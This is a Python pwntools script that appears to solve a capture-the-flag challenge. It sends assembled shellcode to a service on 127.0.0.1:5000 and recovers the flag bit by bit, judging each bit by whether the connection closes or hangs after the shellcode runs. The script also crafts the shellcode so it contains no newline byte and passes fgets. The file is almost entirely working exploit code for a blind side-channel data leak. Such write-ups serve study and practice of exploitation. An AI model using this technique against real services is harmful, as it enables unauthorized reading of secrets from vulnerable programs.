from pwn import *
import time
import os

context.update(os = "linux", arch = "amd64")

# erase comments in assembly code because pwntools sees them as preprocessor macros
def erase_comments(asm_code):
	while "#" in asm_code:
		start = asm_code.find("#")
		end = asm_code.find("\n", start)
		asm_code = asm_code[:start] + asm_code[end:]
	return asm_code

with open("shellcode.s") as f:
	shellcode_asm_template = erase_comments(f.read())

flag = b""
p = None

# check one bit multiple times and return the majority.
# used to reduce the effect of single bit errors
def check_bit_multiple_times(shellcode):
	results = []
	for i in range(1):	# currently just checking once, increase this number to increase accuracy (but also increase execution time)
		results.append(check_bit(shellcode))
	return results.count(True) > len(results)/2

# check if a particular bit of the flag is 0 or 1
# (i.e. check if the network service closes the connection
# after receiving the shellcode)
def check_bit(shellcode):
	global p
	with context.local(log_level = "error"):
		p = remote("127.0.0.1", 5000)
	p.sendlineafter(b"Shellcode: ", shellcode)
	time.sleep(1)
	try:
		p.send(b"123\n")
		p.recv(10, timeout = 0.1)	# if the connection hangs, the shellcode ended in the infinite loop
		return False
	except EOFError:	# connection closed by remote service
		return True
	finally:
		with context.local(log_level = "error"):
			p.close()

while not flag.endswith(b"}"):
	current_byte = 0
	for bit in range(8):
		# using a small trick to prevent having '\n' in our shellcode (to avoid problems with fgets() reading our shellcode).
		# if the index of the character we're looking at is 10, use 'inc rsp' and 'rsp+9' instead of 'rsp+10'
		if len(flag) != 0x0a:
			shellcode_asm = shellcode_asm_template % ("", len(flag), (1 << bit))
		else:
			shellcode_asm = shellcode_asm_template % ("inc rsp", len(flag) - 1, (1 << bit))
		shellcode = asm(shellcode_asm)
		assert(len(shellcode) <= 0x7b)
		if (check_bit_multiple_times(shellcode)):
			current_byte |= (1 << bit)
		log.info("current byte = 0b" + bin(current_byte)[2:].rjust(8, "0"))
	flag += bytes([current_byte])
	log.success("flag = " + repr(flag))

